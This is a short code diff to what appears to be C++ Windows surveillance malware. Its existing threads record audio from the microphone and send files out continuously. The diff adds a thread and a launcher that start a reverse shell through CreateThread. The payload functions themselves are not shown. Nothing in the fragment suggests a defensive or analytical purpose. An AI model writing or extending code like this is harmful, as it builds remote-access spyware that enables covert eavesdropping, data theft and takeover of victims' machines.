@@ -10,6 +10,10 @@ DWORD WINAPI threadEnregistrementAudio(LPVOID windowsPointerParams) {
     constantListen();
 }
 
+DWORD WINAPI threadReverseShell(LPVOID windowsPointerParams) {
+    startReverseShell();
+}
+
 DWORD WINAPI fileSendingThread(LPVOID windowsPointerParams){
     while(true)continuousFileSend();
 }
@@ -24,4 +28,8 @@ void beginAudioRecording(HANDLE &thread, LPDWORD threadId) {
 
 void beginfileSendingThread(HANDLE &thread, LPDWORD threadId){
     thread = CreateThread(NULL, 0, fileSendingThread, NULL, 0, threadId);
+}
+
+void beginReverseShellThread(HANDLE &thread, LPDWORD threadId){
+    thread = CreateThread(NULL, 0, threadReverseShell, NULL, 0, threadId);
 }
